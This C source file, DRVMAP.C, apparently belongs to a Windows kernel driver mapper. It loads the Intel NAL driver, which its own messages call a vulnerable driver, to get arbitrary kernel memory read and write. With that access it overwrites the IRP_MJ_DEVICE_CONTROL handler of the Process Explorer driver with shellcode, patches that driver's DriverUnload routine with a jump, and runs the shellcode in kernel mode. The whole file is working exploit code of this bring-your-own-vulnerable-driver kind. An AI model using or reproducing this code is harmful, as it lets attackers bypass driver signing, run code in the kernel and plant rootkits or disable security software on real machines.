/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020
*
*  TITLE:       DRVMAP.C
*
*  VERSION:     1.01
*
*  DATE:        20 Apr 2020
*
*  Driver mapping routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include "tsmisc.h"

#pragma comment(lib, "version.lib")

#define PROVIDER_NAME   L"IntelNal"
#define PROVIDER_DEVICE L"Nal"

//
// Provider version we expect.
//
#define PROVIDER_VER_MAJOR      1
#define PROVIDER_VER_MINOR      3
#define PROVIDER_VER_BUILD      0
#define PROVIDER_VER_REVISION   7

BOOLEAN g_DriverAlreadyLoaded = FALSE;
PMAPPED_CODE_DATA g_MappedData;

/*
* QueryDriverUnloadOffset
*
* Purpose:
*
* Return offset to the DriverUnload procedure in TSMI shellcode.
*
*/
ULONG QueryDriverUnloadOffset(
    _In_ PBYTE ShellcodePtr,
    _In_ ULONG ShellCodeSize
)
{
    ULONG  length = 0, offset = 0;
    PUCHAR pOpcode;
    hde64s hs;

    __try {

        //
        // Calculate next procedure offset.
        //
        do {
            pOpcode = (UCHAR*)RtlOffsetToPointer(ShellcodePtr, offset);
            hde64_disasm(pOpcode, &hs);
            if (hs.flags & F_ERROR) {
                offset = 0;
                break;
            }

            length = hs.len;
            offset += length;

            //
            // End of function found.
            //
            if ((length == 1) && (*pOpcode == 0xC3)) {

                //
                // Skip padding bytes if present.
                //
                do {
                    pOpcode = (UCHAR*)RtlOffsetToPointer(ShellcodePtr, offset);
                    hde64_disasm(pOpcode, &hs);
                    if (hs.flags & F_ERROR) {
                        offset = 0;
                        break;
                    }

                    if ((hs.len == 1) && (*pOpcode == 0xCC))
                        offset += hs.len;

                } while (*pOpcode == 0xCC);

                break;
            }

        } while (offset < ShellCodeSize);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return 0;
    }
    return offset;
}

/*
* VirtualToPhysical
*
* Purpose:
*
* Provider wrapper for VirtualToPhysical routine.
*
*/
BOOL WINAPI VirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return NalVirtualToPhysical(DeviceHandle,
        VirtualAddress,
        PhysicalAddress);
}

/*
* ReadKernelVM
*
* Purpose:
*
* Provider wrapper for ReadKernelVM routine.
*
*/
BOOL WINAPI ReadKernelVM(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    if (Address < g_MaximumUserModeAddress) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    return NalReadVirtualMemoryEx(DeviceHandle,
        Address,
        Buffer,
        NumberOfBytes);
}

/*
* WriteKernelVM
*
* Purpose:
*
* Provider wrapper for WriteKernelVM routine.
*
*/
BOOL WINAPI WriteKernelVM(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    if (Address < g_MaximumUserModeAddress) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    return NalWriteVirtualMemoryEx(DeviceHandle,
        Address,
        Buffer,
        NumberOfBytes);
}

/*
* CheckMemoryLayout
*
* Purpose:
*
* Check if shellcode can be placed within the same/next physical page(s).
*
*/
BOOL CheckMemoryLayout(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR TargetAddress,
    _In_ ULONG SizeOfShell
)
{
    ULONG_PTR memPage, physAddrStart, physAddrEnd;

    memPage = (TargetAddress & 0xfffffffffffff000ull);

    if (VirtualToPhysical(DeviceHandle,
        memPage,
        &physAddrStart))
    {
        memPage = (TargetAddress + SizeOfShell) & 0xfffffffffffff000ull;

        if (VirtualToPhysical(DeviceHandle,
            memPage,
            &physAddrEnd))
        {
            ULONG_PTR diffAddr = physAddrEnd - physAddrStart;

            if (diffAddr > PAGE_SIZE)
                return FALSE;
            else
                return TRUE;
        }

    }
    return FALSE;
}

/*
* ValidateLoadedDriver
*
* Purpose:
*
* Examine loaded driver if it has newer version, if so - we cannot use it.
*
*/
BOOL ValidateLoadedDriver(
    _In_ LPWSTR DriverServiceName
)
{
    BOOL bDrvValid = FALSE;
    HANDLE schManager = NULL, schService = NULL;
    QUERY_SERVICE_CONFIG* lpsc = NULL;
    DWORD dwBytesNeeded = 0, dwError, cbBufSize = 0;

    ULONG ulDisp, ulMajor, ulMinor, ulBuild, ulRevision;

    NTSTATUS ntStatus;
    RTL_UNICODE_STRING_BUFFER dosPath;
    WCHAR szConversionBuffer[MAX_PATH * 2];

    SUP_VERINFO_NUMBERS verInfo;

    do {

        //
        // Open SCM.
        //
        schManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (schManager == NULL) {
            printf_s("[!] OpenSCManager failed (Error %lu)\r\n", GetLastError());
            break;
        }

        //
        // Open provider service.
        //
        schService = OpenService(schManager, DriverServiceName, SERVICE_QUERY_CONFIG);
        if (schService == NULL) {
            printf_s("[!] OpenService failed (Error %lu)\r\n", GetLastError());
            break;
        }

        printf_s("[!] Vulnerable provider device already exist, checking loaded driver version\r\n");

        //
        // Query service binary file.
        //
        // 1st: query required size and allocate required buffer.
        //
        if (!QueryServiceConfig(
            schService,
            NULL,
            0,
            &dwBytesNeeded))
        {
            dwError = GetLastError();
            if (ERROR_INSUFFICIENT_BUFFER == dwError)
            {
                cbBufSize = dwBytesNeeded;
                lpsc = (LPQUERY_SERVICE_CONFIG)supHeapAlloc(cbBufSize);
            }
            else
            {
                printf_s("[!] QueryServiceConfig failed (Error %lu)\r\n", dwError);
                break;
            }
        }

        if (lpsc == NULL) {
            printf_s("[!] Could not allocate memory for service config query\r\n");
            break;
        }

        //
        // Read service config.
        //
        if (!QueryServiceConfig(
            schService,
            lpsc,
            cbBufSize,
            &dwBytesNeeded))
        {
            printf("QueryServiceConfig failed (Error %lu)\r\n", GetLastError());
            break;
        }

        //
        // Convert filename from Nt to Dos type (remove \??\).
        //
        RtlSecureZeroMemory(&szConversionBuffer, sizeof(szConversionBuffer));
        RtlSecureZeroMemory(&dosPath, sizeof(dosPath));
        RtlInitUnicodeString(&dosPath.String, lpsc->lpBinaryPathName);

        //
        // Ensure conversion buffer length is enough.
        //
        RtlInitBuffer(&dosPath.ByteBuffer, (PUCHAR)szConversionBuffer, sizeof(szConversionBuffer));
        ntStatus = RtlEnsureBufferSize(RTL_ENSURE_BUFFER_SIZE_NO_COPY,
            &dosPath.ByteBuffer,
            dosPath.String.MaximumLength);

        if (!NT_SUCCESS(ntStatus)) {
            printf("[!] RtlEnsureBufferSize NTSTATUS (0x%lX)\r\n", ntStatus);
            break;
        }

        //
        // Copy filename to buffer.
        //
        RtlCopyMemory(dosPath.ByteBuffer.Buffer,
            dosPath.String.Buffer,
            dosPath.String.MaximumLength);

        //
        // Update pointer.
        //
        dosPath.String.Buffer = (PWSTR)dosPath.ByteBuffer.Buffer;

        ntStatus = RtlNtPathNameToDosPathName(0, &dosPath, &ulDisp, NULL);
        if (!NT_SUCCESS(ntStatus)) {
            printf("[!] RtlNtPathNameToDosPathName NTSTATUS (0x%lX)\r\n", ntStatus);
            break;
        }

        //
        // Query driver file version.
        //
        verInfo.VersionLS = 0xFFFFFFFF;
        verInfo.VersionMS = 0xFFFFFFFF;
#pragma warning(push)
#pragma warning(disable: 6054)
        if (!supGetImageVersionInfo(dosPath.String.Buffer, &verInfo)) {
            printf("[!] supGetImageVersionInfo failed, (Error %lu)\r\n", GetLastError());
            break;
        }
#pragma warning(pop)

        ulMajor = (verInfo.VersionMS >> 16) & 0xffff;
        ulMinor = verInfo.VersionMS & 0xffff;
        ulBuild = (verInfo.VersionLS >> 16) & 0xffff;
        ulRevision = verInfo.VersionLS & 0xffff;

        printf_s("LDR: Currently loaded driver version %lu.%lu.%lu.%lu, required version %lu.%lu.%lu.%lu\r\n",
            ulMajor,
            ulMinor,
            ulBuild,
            ulRevision,
            PROVIDER_VER_MAJOR,
            PROVIDER_VER_MINOR,
            PROVIDER_VER_BUILD,
            PROVIDER_VER_REVISION);

        //
        // Check version values against known, abort on any mismatch.
        //
        if ((ulMajor != PROVIDER_VER_MAJOR) ||
            (ulMinor != PROVIDER_VER_MINOR) ||
            (ulBuild != PROVIDER_VER_BUILD) ||
            (ulRevision != PROVIDER_VER_REVISION))
        {
            printf_s("[!] Driver version is unknown and we cannot continue.\r\n"\
                "If you still want to use this loader find and uninstall software that uses this driver first!\r\n");
            SetLastError(ERROR_UNKNOWN_REVISION);
            break;
        }
        else {
            printf_s("LDR: Loaded driver version is compatible, processing next\r\n");
        }

        bDrvValid = TRUE;

    } while (FALSE);

    if (schService) CloseServiceHandle(schService);
    if (schManager) CloseServiceHandle(schManager);
    if (lpsc) supHeapFree(lpsc);

    return bDrvValid;
}

/*
* StartVulnerableDriver
*
* Purpose:
*
* Load vulnerable driver and return handle for it device or NULL in case of error.
*
*/
HANDLE StartVulnerableDriver(
    _In_ ULONG uResourceId,
    _In_ HINSTANCE hInstance,
    _In_ LPWSTR lpDriverName,
    _In_ LPWSTR lpDeviceName,
    _In_ LPWSTR lpFullFileName
)
{
    BOOL     bLoaded = FALSE;
    PBYTE    drvBuffer;
    NTSTATUS ntStatus;
    ULONG    resourceSize = 0;
    HANDLE   deviceHandle = NULL;

    printf_s("[>] Entering %s\r\n", __FUNCTION__);

    g_DriverAlreadyLoaded = FALSE;

    //
    // Check if driver already loaded.
    //
    if (supIsObjectExists((LPWSTR)L"\\Device", lpDeviceName)) {
        g_DriverAlreadyLoaded = TRUE;
        bLoaded = ValidateLoadedDriver(PROVIDER_DEVICE);
    }
    else {

        //
        // Driver is not loaded, load it.
        //

        drvBuffer = supQueryResourceData(uResourceId, hInstance, &resourceSize);
        if (drvBuffer == NULL) {
            printf_s("[!] Driver resource id not found %lu\r\n", uResourceId);
            return NULL;
        }

        if (resourceSize != (ULONG)supWriteBufferToFile(lpFullFileName,
            drvBuffer,
            resourceSize,
            TRUE,
            FALSE,
            &ntStatus))
        {
            printf_s("[!] Unable to extract vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
            return NULL;
        }

        ntStatus = supLoadDriver(lpDriverName, lpFullFileName, FALSE);
        if (NT_SUCCESS(ntStatus)) {
            printf_s("LDR: Vulnerable driver \"%ws\" loaded\r\n", lpDriverName);
            bLoaded = TRUE;
        }
        else {
            printf_s("[!] Unable to load vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
            DeleteFile(lpFullFileName);
        }
    }

    if (bLoaded) {
        ntStatus = supOpenDriver(lpDeviceName, &deviceHandle);
        if (!NT_SUCCESS(ntStatus))
            printf_s("[!] Unable to open vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
        else
            printf_s("LDR: Vulnerable driver opened, handle 0x%p\r\n", deviceHandle);
    }

    printf_s("[<] Leaving %s\r\n", __FUNCTION__);

    return deviceHandle;
}

/*
* StopVulnerableDriver
*
* Purpose:
*
* Unload previously loaded vulnerable driver.
*
*/
void StopVulnerableDriver(
    _In_ LPWSTR lpDriverName,
    _In_opt_ LPWSTR lpFullFileName
)
{
    NTSTATUS ntStatus;

    printf_s("[>] Entering %s\r\n", __FUNCTION__);

    if (g_DriverAlreadyLoaded) {
        printf_s("[!] Vulnerable driver wasn't loaded, skip\r\n");
    }
    else {

        ntStatus = supUnloadDriver(lpDriverName, TRUE);
        if (!NT_SUCCESS(ntStatus)) {
            printf_s("[!] Unable to unload vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
        }
        else {

            printf_s("LDR: Vulnerable driver unloaded\r\n");
            ULONG retryCount = 3;

            if (lpFullFileName) {
                do {
                    Sleep(1000);
                    if (DeleteFile(lpFullFileName)) {
                        printf_s("LDR: Vulnerable driver file removed\r\n");
                        break;
                    }

                    retryCount--;

                } while (retryCount);
            }
        }

    }

    printf_s("[<] Leaving %s\r\n", __FUNCTION__);
}

/*
* ProviderCreate
*
* Purpose:
*
* Load vulnerable driver and return it device handle and filename.
*
*/
BOOL ProviderCreate(
    _Out_ HANDLE* DeviceHandle,
    _Out_ LPWSTR* DriverFileName)
{
    BOOL bResult = FALSE;
    HANDLE deviceHandle = NULL;
    HINSTANCE hInstance = GetModuleHandle(NULL);
    LPWSTR driverFileName;

    *DeviceHandle = NULL;
    *DriverFileName = NULL;

    printf_s("[>] Entering %s\r\n", __FUNCTION__);

    do {

        PUNICODE_STRING CurrentDirectory = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
        SIZE_T length = 64 +
            (_strlen(PROVIDER_NAME) * sizeof(WCHAR)) +
            CurrentDirectory->Length;

        //
        // Build filename for vulnerable driver.
        //
        driverFileName = (LPWSTR)supHeapAlloc(length);
        if (driverFileName == NULL) {
            printf_s("[!] Could not allocate memory for driver name (Error %lu)\r\n", GetLastError());
            break;
        }

        length = CurrentDirectory->Length / sizeof(WCHAR);

        _strncpy(driverFileName,
            length,
            CurrentDirectory->Buffer,
            length);

        _strcat(driverFileName, TEXT("\\"));
        _strcat(driverFileName, PROVIDER_NAME);
        _strcat(driverFileName, TEXT(".sys"));

        //
        // Install and run vulnerable driver.
        //
        deviceHandle = StartVulnerableDriver(IDR_iQVM64,
            hInstance,
            PROVIDER_NAME,
            PROVIDER_DEVICE,
            driverFileName);

        if (deviceHandle == NULL) {
            supHeapFree(driverFileName);
            *DeviceHandle = NULL;
            *DriverFileName = NULL;
        }
        else {
            *DeviceHandle = deviceHandle;
            *DriverFileName = driverFileName;
            bResult = TRUE;
        }

    } while (FALSE);

    printf_s("[<] Leaving %s\r\n", __FUNCTION__);

    return bResult;
}

/*
* ProviderRelease
*
* Purpose:
*
* Unload vulnerable driver and free resources.
*
*/
VOID ProviderRelease(
    _In_ HANDLE DeviceHandle,
    _In_ LPWSTR DriverFileName)
{
    printf_s("[>] Entering %s\r\n", __FUNCTION__);

    if (DeviceHandle) {
        CloseHandle(DeviceHandle);
        StopVulnerableDriver(PROVIDER_NAME, DriverFileName);

        if (DriverFileName)
            supHeapFree(DriverFileName);
    }

    printf_s("[<] Leaving %s\r\n", __FUNCTION__);
}

PVOID ResolveFunction(
    _In_ ULONG_PTR KernelBase,
    _In_ ULONG_PTR KernelImage,
    _In_ LPCSTR Function)
{
    ULONG_PTR Address = supGetProcAddress(KernelBase, KernelImage, Function);
    if (Address == 0) {
        printf_s("[!] Error, %s address not found\r\n", Function);
        return 0;
    }

    printf_s("LDR: %s 0x%llX\r\n", Function, Address);
    return (PVOID)Address;
}

#define ASSERT_RESOLVED_FUNC(FunctionPtr) { if (FunctionPtr == 0) break; }

/*
* SetupShellCode
*
* Purpose:
*
* Create and fill shellcode with data.
*
*/
BOOL SetupShellCode(
    _In_ PTABLE_DESC ConfigurationData)
{
    BOOL bResult = FALSE;
    NTSTATUS ntStatus;
    UNICODE_STRING ustr;

    ULONG_PTR KernelBase, KernelImage = 0;

    WCHAR szNtOs[MAX_PATH * 2];

    printf_s("[>] Entering %s\r\n", __FUNCTION__);

    do {

        KernelBase = supGetNtOsBase();
        if (KernelBase == 0) {
            printf_s("[!] Cannot query ntoskrnl loaded base, abort\r\n");
            break;
        }

        printf_s("LDR: Loaded ntoskrnl base 0x%llX\r\n", KernelBase);

        //
       // Preload ntoskrnl.exe
       //
        _strcpy(szNtOs, USER_SHARED_DATA->NtSystemRoot);
        _strcat(szNtOs, L"\\system32\\ntoskrnl.exe");

        RtlInitUnicodeString(&ustr, szNtOs);
        ntStatus = LdrLoadDll(NULL, NULL, &ustr, (PVOID*)&KernelImage);

        if ((!NT_SUCCESS(ntStatus)) || (KernelImage == 0)) {
            printf_s("[!] Error while loading ntoskrnl.exe, NTSTATUS (0x%lX)\r\n", ntStatus);
            break;
        }

        printf_s("LDR: Ntoskrnl.exe mapped at 0x%llX\r\n", KernelImage);

        //
        // Allocate shellcode.
        //
        g_MappedData = (PMAPPED_CODE_DATA)VirtualAlloc(NULL, sizeof(MAPPED_CODE_DATA),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE);

        if (g_MappedData == NULL)
            break;

        //
        // Remember function pointers.
        //

        g_MappedData->_wcsnicmp =
            ResolveFunction(KernelBase, KernelImage, "_wcsnicmp");
        ASSERT_RESOLVED_FUNC(g_MappedData->_wcsnicmp);

        g_MappedData->IoAllocateMdl =
            ResolveFunction(KernelBase, KernelImage, "IoAllocateMdl");
        ASSERT_RESOLVED_FUNC(g_MappedData->IoAllocateMdl);

        g_MappedData->IofCompleteRequest =
            ResolveFunction(KernelBase, KernelImage, "IofCompleteRequest");
        ASSERT_RESOLVED_FUNC(g_MappedData->IofCompleteRequest);

        g_MappedData->IoFreeMdl =
            ResolveFunction(KernelBase, KernelImage, "IoFreeMdl");
        ASSERT_RESOLVED_FUNC(g_MappedData->IoFreeMdl);

        g_MappedData->PsGetCurrentProcessId =
            ResolveFunction(KernelBase, KernelImage, "PsGetCurrentProcessId");
        ASSERT_RESOLVED_FUNC(g_MappedData->PsGetCurrentProcessId);

        g_MappedData->PsSetLoadImageNotifyRoutine =
            ResolveFunction(KernelBase, KernelImage, "PsSetLoadImageNotifyRoutine");
        ASSERT_RESOLVED_FUNC(g_MappedData->PsSetLoadImageNotifyRoutine);

        g_MappedData->MmProtectMdlSystemAddress =
            ResolveFunction(KernelBase, KernelImage, "MmProtectMdlSystemAddress");
        ASSERT_RESOLVED_FUNC(g_MappedData->MmProtectMdlSystemAddress);

        g_MappedData->MmUnmapLockedPages =
            ResolveFunction(KernelBase, KernelImage, "MmUnmapLockedPages");
        ASSERT_RESOLVED_FUNC(g_MappedData->MmUnmapLockedPages);

        g_MappedData->MmUnlockPages =
            ResolveFunction(KernelBase, KernelImage, "MmUnlockPages");
        ASSERT_RESOLVED_FUNC(g_MappedData->MmUnlockPages);

        g_MappedData->MmProbeAndLockPages =
            ResolveFunction(KernelBase, KernelImage, "MmProbeAndLockPages");
        ASSERT_RESOLVED_FUNC(g_MappedData->MmProbeAndLockPages);

        g_MappedData->MmMapLockedPagesSpecifyCache =
            ResolveFunction(KernelBase, KernelImage, "MmMapLockedPagesSpecifyCache");
        ASSERT_RESOLVED_FUNC(g_MappedData->MmMapLockedPagesSpecifyCache);

        g_MappedData->KeDelayExecutionThread =
            ResolveFunction(KernelBase, KernelImage, "KeDelayExecutionThread");
        ASSERT_RESOLVED_FUNC(g_MappedData->KeDelayExecutionThread);

        g_MappedData->PsRemoveLoadImageNotifyRoutine =
            ResolveFunction(KernelBase, KernelImage, "PsRemoveLoadImageNotifyRoutine");
        ASSERT_RESOLVED_FUNC(g_MappedData->PsRemoveLoadImageNotifyRoutine);

        g_MappedData->IoDeleteSymbolicLink =
            ResolveFunction(KernelBase, KernelImage, "IoDeleteSymbolicLink");
        ASSERT_RESOLVED_FUNC(g_MappedData->IoDeleteSymbolicLink);

        g_MappedData->IoDeleteDevice =
            ResolveFunction(KernelBase, KernelImage, "IoDeleteDevice");
        ASSERT_RESOLVED_FUNC(g_MappedData->IoDeleteDevice);

        g_MappedData->RtlInitUnicodeString =
            ResolveFunction(KernelBase, KernelImage, "RtlInitUnicodeString");
        ASSERT_RESOLVED_FUNC(g_MappedData->RtlInitUnicodeString);

        g_MappedData->ConfigurationDataSize = ConfigurationData->DDTableSize;
        RtlCopyMemory(&g_MappedData->ConfigurationData,
            ConfigurationData->DDTablePointer,
            ConfigurationData->DDTableSize);

        bResult = TRUE;

    } while (FALSE);

    printf_s("[<] Leaving %s\r\n", __FUNCTION__);

    return bResult;
}

/*
* MapTsugumi
*
* Purpose:
*
* Load and run shellcode inside victim driver using vulnerable driver.
*
*/
BOOL MapTsugumi(
    _In_ PTABLE_DESC ConfigurationData
)
{
    BOOL bResult = FALSE, bSuccess = FALSE;
    ULONG_PTR objectAddress, IRPHandlerAddress = 0, DataSectionAddress = 0;
    HANDLE providerHandle = NULL;
    HANDLE victimHandle = NULL;
    HINSTANCE hInstance = GetModuleHandle(NULL);
    LPWSTR driverFileName = NULL;

    PIMAGE_DOS_HEADER       hdrDriver = NULL;
    PIMAGE_NT_HEADERS64     pehdr;
    PIMAGE_SECTION_HEADER   sections;
    ULONG                   c;
    LONG32                  JMP_Offset;
    BYTE                    JMP_Instruction[16] = {
        0xe9, 0, 0, 0, 0, 0xcc, 0xcc, 0xcc,
        0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc
    };

    printf_s("[>] Entering %s\r\n", __FUNCTION__);

    if (!ProviderCreate(&providerHandle, &driverFileName)) {
        printf_s("[!] ProviderCreate failed, abort\r\n");
        return FALSE;
    }

    ULONG retryCount = 1, maxRetry = 3;

    FILE_OBJECT fileObject;
    DEVICE_OBJECT deviceObject;
    DRIVER_OBJECT driverObject;

Reload:

    printf_s("LDR: Victim driver map attempt %lu of %lu\r\n", retryCount, maxRetry);
    RtlSecureZeroMemory(&driverObject, sizeof(driverObject));

    //
    // If this is reload, release victim.
    //
    if (victimHandle) {
        NtClose(victimHandle);
        victimHandle = NULL;
        VictimRelease((LPWSTR)PROCEXP152);
    }

    if (VictimCreate(hInstance,
        (LPWSTR)PROCEXP152,
        IDR_PROCEXP,
        &victimHandle))
    {
        printf_s("LDR: Victim driver loaded, handle 0x%p\r\n", victimHandle);
    }
    else {
        printf_s("LDR: Could not load victim driver (Error %lu)\r\n", GetLastError());
    }

    if (supQueryObjectFromHandle(victimHandle, &objectAddress)) {

        do {

            RtlSecureZeroMemory(&fileObject, sizeof(fileObject));

            if (!ReadKernelVM(providerHandle,
                objectAddress,
                &fileObject,
                sizeof(FILE_OBJECT)))
            {
                printf_s("[!] Could not read FILE_OBJECT at 0x%llX (Error %lu)\r\n", objectAddress, GetLastError());
                break;
            }
            else {
                printf_s("LDR: Reading FILE_OBJECT at 0x%llX - OK\r\n", objectAddress);
            }           

            RtlSecureZeroMemory(&deviceObject, sizeof(deviceObject));

            if (!ReadKernelVM(providerHandle,
                (ULONG_PTR)fileObject.DeviceObject,
                &deviceObject,
                sizeof(DEVICE_OBJECT)))
            {
                printf_s("[!] Could not read DEVICE_OBJECT at 0x%p (Error %lu)\r\n", fileObject.DeviceObject, GetLastError());
                break;
            }
            else {
                printf_s("LDR: Reading DEVICE_OBJECT at 0x%p - OK\r\n", fileObject.DeviceObject);
            }
            
            if (!ReadKernelVM(providerHandle,
                (ULONG_PTR)deviceObject.DriverObject,
                &driverObject,
                sizeof(DRIVER_OBJECT)))
            {
                printf_s("[!] Could not read DRIVER_OBJECT at 0x%p (Error %lu)\r\n", deviceObject.DriverObject, GetLastError());
                break;
            }
            else {
                printf_s("LDR: Reading DRIVER_OBJECT at 0x%p - OK\r\n", deviceObject.DriverObject);
            }

            hdrDriver = VirtualAlloc(NULL, PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!hdrDriver) {
                printf_s("[!] Memory allocation error, (Error %lu)\r\n", GetLastError());
                break;
            }

            if (!ReadKernelVM(providerHandle,
                (ULONG_PTR)driverObject.DriverStart,
                hdrDriver,
                PAGE_SIZE))
            {
                printf_s("[!] Could not read driver image header at 0x%p (Error %lu)\r\n", driverObject.DriverStart, GetLastError());
                break;
            }
            else {
                printf_s("LDR: Victim driver image header at 0x%p read - OK\r\n", driverObject.DriverStart);
            }

            pehdr = (PIMAGE_NT_HEADERS64)((ULONG_PTR)hdrDriver + hdrDriver->e_lfanew);
            sections = (PIMAGE_SECTION_HEADER)((ULONG_PTR)&pehdr->FileHeader +
                sizeof(IMAGE_FILE_HEADER) + pehdr->FileHeader.SizeOfOptionalHeader);

            for (c = 0; c < pehdr->FileHeader.NumberOfSections; ++c)
            {
                if (_strcmp_a((const char*)sections[c].Name, ".data") == 0)
                {
                    DataSectionAddress = sections[c].VirtualAddress + (ULONG_PTR)driverObject.DriverStart;
                }
            }

            if (!DataSectionAddress) {
                printf_s("[!] Could not find data section\r\n");
                break;
            }
            else {
                printf_s("LDR: Victim data section %llX\r\n", DataSectionAddress);
            }

            // fixing data pointers in the shellcode

            for (c = 0; c < sizeof(x64kernelcode) - sizeof(ULONG64); ++c)
            {
                if (*(PULONG64)&x64kernelcode[c] == 0x1337C0DE1CEDC01Aull)
                {
                    *(PULONG64)&x64kernelcode[c] = DataSectionAddress;
                }
            }

            //
            // ProcExp handle no longer needed, can be closed.
            //
            CloseHandle(victimHandle);
            victimHandle = NULL;

            IRPHandlerAddress = (ULONG_PTR)driverObject.MajorFunction[IRP_MJ_DEVICE_CONTROL];

            //
            // Check memory layout.
            //
            if (!CheckMemoryLayout(providerHandle, IRPHandlerAddress, sizeof(x64kernelcode))) {

                printf_s("[!] Physical address is not within same/next page, reload victim driver\r\n");
                retryCount += 1;
                if (retryCount > maxRetry) {
                    printf_s("[!] Too many reloads, abort\r\n");
                    break;
                }
                goto Reload;

            }

            printf_s("LDR: Victim IRP_MJ_DEVICE_CONTROL 0x%llX\r\n", IRPHandlerAddress);
            printf_s("LDR: Victim DriverUnload 0x%p\r\n", driverObject.DriverUnload);

            bSuccess = TRUE;

        } while (FALSE);

        if (hdrDriver)
            VirtualFree(hdrDriver, 0, MEM_RELEASE);
    }

    //
    // Ensure ProcExp handle is closed.
    //
    if (victimHandle) {
        NtClose(victimHandle);
        victimHandle = NULL;
    }

    //
    // Victim loaded successfully.
    //
    if (bSuccess) {

        if (SetupShellCode(ConfigurationData)) {

            //
            // Write shellcode to driver.
            //
            ULONG UnloadRoutineOffset = QueryDriverUnloadOffset(x64kernelcode, sizeof(x64kernelcode));

            if (UnloadRoutineOffset) {

                JMP_Offset = (LONG32)(IRPHandlerAddress + UnloadRoutineOffset - (ULONG_PTR)driverObject.DriverUnload - 5);
                *(PLONG32)(&JMP_Instruction[1]) = JMP_Offset;
                bSuccess = WriteKernelVM(providerHandle, DataSectionAddress, g_MappedData, sizeof(MAPPED_CODE_DATA));
                bSuccess &= WriteKernelVM(providerHandle, IRPHandlerAddress, x64kernelcode, sizeof(x64kernelcode));
                bSuccess &= WriteKernelVM(providerHandle, (ULONG_PTR)driverObject.DriverUnload, JMP_Instruction, sizeof(JMP_Instruction));
                if (bSuccess)
                {
                    printf_s("LDR: Driver IRP_MJ_DEVICE_CONTROL handler code modified\r\n");

                    //
                    // Run shellcode.
                    // Target has the same handlers for IRP_MJ_CREATE/CLOSE/DEVICE_CONTROL
                    //
                    printf_s("LDR: Run shellcode\r\n");
                    Sleep(1000);
                    supOpenDriver((LPWSTR)PROCEXP152, &victimHandle);
                    Sleep(1000);
                    bResult = TRUE;
                }
                else
                {
                    printf_s("[!] Error writing shell code to the target driver, (Error %lu)\r\n", GetLastError());
                }
            }
            else {
                printf_s("[!] Error calculating shellcode DriverUnload offset\r\n");
            }
        }
        else {
            printf_s("[!] Error while building shellcode, abort\r\n");
        }
    }

    ProviderRelease(providerHandle, driverFileName);

    /*

    //
    // Unload procexp victim. Used only while debugging.
    //
    if (VictimRelease((LPWSTR)PROCEXP152)) {
        printf_s("LDR: Victim driver unloaded\r\n");
    }

    */
    printf_s("[<] Leaving %s\r\n", __FUNCTION__);

    return bResult;
}
